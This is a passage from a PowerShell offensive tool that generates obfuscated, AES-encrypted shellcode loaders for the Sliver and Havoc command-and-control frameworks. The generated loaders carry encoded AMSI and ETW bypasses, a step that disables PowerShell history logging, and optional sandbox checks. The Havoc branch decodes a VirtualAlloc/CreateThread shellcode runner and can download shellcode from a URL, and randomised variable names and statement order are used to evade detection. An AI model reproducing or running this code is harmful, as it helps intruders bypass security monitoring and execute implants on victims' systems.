        $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order8 -join ''
        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order9 -join ''
        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order10 -join ''
        $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order11 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order12 -join ''
        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order13 -join ''
        $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order14 -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $Code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $Code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $Code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $Code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $Code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $Code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $Code_alternatives  = @()
        $Code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $Code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $ShellCodeLoaderFile += '${5}.CopyTo(${7})' + "`r`n"

        $Code_alternatives  = @()
        $Code_alternatives += '${5}.Close()' + "`r`n"
        $Code_alternatives += '${4}.Dispose()' + "`r`n"
        $Code_alternatives += '${6}.Close()' + "`r`n"
        $Code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
        
        Write-Output "[*] The obfuscated & encrypted Sliver shellcode loader script has been saved: '$($Outfile)' ..."
        [System.IO.File]::WriteAllText($Outfile,$Code)
        Write-Output "[+] Done!"
        }

    'Havoc' {
        $TempShellCodeLoaderFile = "C:\Windows\Temp\templateloader.ps1"
        $ShellcodeLoaderPart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JE5pY29sYXMgPSBAIgpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvYyhJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7CltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOwoiQAokSmVmZiA9IEFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICROaWNvbGFzIC1OYW1lICJXaW4zMiIgLW5hbWVzcGFjZSBXaW4zMkZ1bmN0aW9ucyAtcGFzc3RocnUKCltCeXRlW11dICRidWYgPSA=")))
        $ShellcodeLoaderPart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("CiRWaW5jZW50ID0gJEplZmY6OlZpcnR1YWxBbGxvYygwLFtNYXRoXTo6TWF4KCRidWYuTGVuZ3RoLDB4MTAwMCksMHgzMDAwLDB4NDApCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGJ1ZiwwLCRWaW5jZW50LCRidWYuTGVuZ3RoKQokSmVmZjo6Q3JlYXRlVGhyZWFkKDAsMCwkVmluY2VudCwwLDAsMCk=")))

        if ($Filepath) {	
        Write-Output "[*] Loading the Havoc shellcode: '$($Filepath)"
        $ShellCodestring = Get-Content $Filepath

        Write-Output "[*] Creating the shellcode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $Shellcodeformated + "`r`n");
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        elseif ($Fileurl){
        Write-Output "[*] Downloading the Havoc shellcode: '$($Fileurl)'"
        $ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
        Write-Output "[*] Creating the shellCode loader script"
        [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
        }
        
        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip/Deflate)"
        $TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
        Del "C:\Windows\Temp\templateloader.ps1"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
        	$compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
        $compressionStream.Write( $TempShellCodeLoaderFileRead, 0, $TempShellCodeLoaderFileRead.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } 
        elseif ($ciphermode -eq 'ECB') {
        	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }
        if ($paddingmode -eq 'PKCS7') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } 
        elseif ($paddingmode -eq 'ISO10126') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } 
        elseif ($paddingmode -eq 'ANSIX923') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } 
        elseif ($paddingmode -eq 'Zeros') {
        	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
        $ShellCodeLoaderFile = ''
        
        if ($sandbox) {	
        Write-Output "[*] Adding basic sandbox checks"
        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order1 -join ''
        $code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order2 -join ''
        $code_fixed_order3 += "iN'v'Oke-exPReS'S'iOn"+'(${18})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order3 -join ''
        }
        
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
        $code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
        $code_fixed_order7 += "iN'v'Oke-exPReS'S'iOn"+'(${11})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
        $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order8 -join ''
        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order9 -join ''
        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order10 -join ''
        $code_fixed_order11 += "iN'v'Oke-exPReS'S'iOn"+'(${14})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order11 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order12 -join ''
        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order13 -join ''
        $code_fixed_order14 += "iN'v'Oke-exPReS'S'iOn"+'(${16})' + "`r`n"
        $ShellCodeLoaderFile += $code_fixed_order14 -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $Code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $Code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $Code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $Code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $Code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $Code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $Code_alternatives  = @()
        $Code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $Code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } 
        elseif ( $compressiontype -eq "Deflate") {
        	$ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $ShellCodeLoaderFile += '${5}.CopyTo(${7})' + "`r`n"

        $Code_alternatives  = @()
        $Code_alternatives += '${5}.Close()' + "`r`n"
        $Code_alternatives += '${4}.Dispose()' + "`r`n"
        $Code_alternatives += '${6}.Close()' + "`r`n"
        $Code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
        
        Write-Output "[*] The obfuscated & encrypted Havoc shellcode loader script has been saved: '$($Outfile)' ..."
        [System.IO.File]::WriteAllText($Outfile,$Code)
        Write-Output "[+] Done!"			
		}
	}
  }
}

function Create-Random-Var() {
        $set = "abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789"
        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 1 -Maximum $set.Length)] } ) -join ''
}
